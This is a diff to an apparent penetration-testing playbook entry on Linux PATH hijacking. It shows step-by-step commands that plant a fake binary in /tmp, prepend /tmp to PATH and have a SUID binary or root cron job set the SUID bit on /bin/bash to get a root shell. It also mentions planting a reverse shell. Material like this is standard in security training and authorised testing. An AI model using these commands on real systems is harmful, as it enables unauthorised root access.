@@ -3,40 +3,61 @@ id: linux-path-hijack
 title: Linux PATH Hijacking
 stage: privesc
 tags: [linux]
-tools:
-  - echo $PATH
-  - "strings /usr/bin/suid_binary | grep -v '^/'"
+summary: Plant a malicious binary earlier in PATH than the real one — exploitable when a SUID binary or root cron job calls a program by bare name without a full path.
 leads_to:
   - root-linux
 ---
 
-## Identify the Target
+## Prerequisites
+
+A low-privilege shell. A SUID binary that calls another program by bare name (visible via `strings`), OR a root cron job that uses a relative binary name. A writable directory that can be prepended to PATH (usually `/tmp` or `/dev/shm`).
+
+PATH hijacking exploits the fact that Linux searches directories in PATH order to find a binary name. If a privileged process calls `backup` instead of `/usr/bin/backup`, and you can put your own `backup` in `/tmp` before `/usr/bin` in the search order, your binary runs with the caller's privileges. Use `pspy64` to watch what cron jobs actually execute, and `strings` on SUID binaries to see what programs they invoke.
+
+## Quick Win
+
+> Identify the relative binary name, plant yours in /tmp, export the path, wait for execution.
 
 ```bash
-# Check for relative calls in cron scripts
-cat /etc/crontab && cat /etc/cron.d/*
-# Look for: "service apache2 restart" (calls 'service' without /usr/sbin/service)
+strings /usr/bin/suid_binary | grep -v "^/"   # look for bare binary names
+export PATH=/tmp:$PATH
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/target_binary
+chmod +x /tmp/target_binary
+# Run suid binary or wait for cron → /bin/bash -p
+```
 
-# Check SUID binaries for relative calls
+## Find Hijackable Calls
+
+> Check SUID binaries and cron scripts for relative binary calls.
+
+```bash
+# Check SUID binaries for bare names (anything without a leading /)
 strings /usr/bin/suid_binary | grep -v "^/"
-# If you see bare names like "backup", "cp", "cat" — exploitable if you control a PATH dir
+
+# Check cron scripts
+cat /etc/crontab && cat /etc/cron.d/*
+# Look for lines like: "service apache2 restart" — calls 'service' without full path
 ```
 
 ## Exploit
 
+> Prepend /tmp, plant the malicious binary, trigger the execution.
+
 ```bash
-# Add writable dir to front of PATH
 export PATH=/tmp:$PATH
 
-# Plant malicious binary with the same name
 cat > /tmp/service << 'EOF'
 #!/bin/bash
 chmod +s /bin/bash
 EOF
 chmod +x /tmp/service
 
-# Trigger the cron job or SUID binary
-# Then: /bin/bash -p
+# If triggered by cron: wait
+# If triggered by SUID binary: run it now
+/usr/bin/suid_binary
+
+# After execution:
+/bin/bash -p
 ```
 
 ## What to Look For
@@ -45,6 +66,6 @@ chmod +x /tmp/service
 - SUID binary calling another program by bare name (no `/usr/bin/` prefix)
 - Cron running as root that calls binaries without full paths
 
-## Notes
+## Leads To
 
-Use `pspy64` to watch cron jobs and see exactly what commands they execute. `strings` on a SUID binary reveals what external programs it calls — if any don't use full paths, that's the target.
+Malicious binary executes as root → SUID bash created → `/bin/bash -p` → root-linux. Or plant a reverse shell script as the target binary name → rev-shell as root. Use `pspy64` to watch timing and confirm the hijack fires.
